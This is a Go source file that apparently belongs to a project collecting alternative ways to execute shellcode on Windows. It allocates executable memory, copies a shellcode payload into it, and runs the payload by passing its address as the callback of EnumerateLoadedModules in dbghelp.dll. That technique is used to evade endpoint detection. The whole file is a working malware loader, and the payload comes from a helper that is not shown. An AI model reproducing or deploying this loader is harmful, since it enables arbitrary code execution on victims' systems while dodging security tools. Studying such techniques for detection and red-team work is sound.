package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"golang.org/x/sys/windows"
	"unsafe"
)

func Run(op []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	dbghelp := windows.NewLazySystemDLL("dbghelp.dll")

	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	enumerateLoadedModules := dbghelp.NewProc("EnumerateLoadedModules")
	getCurrentProcess := kernel32.NewProc("GetCurrentProcess")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		panic("VirtualAlloc failed")
	}

	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))

	process, _, _ := getCurrentProcess.Call()
	enumerateLoadedModules.Call(process, addr, 0)
}

func main() {
	Run(util.ShellCode())
}
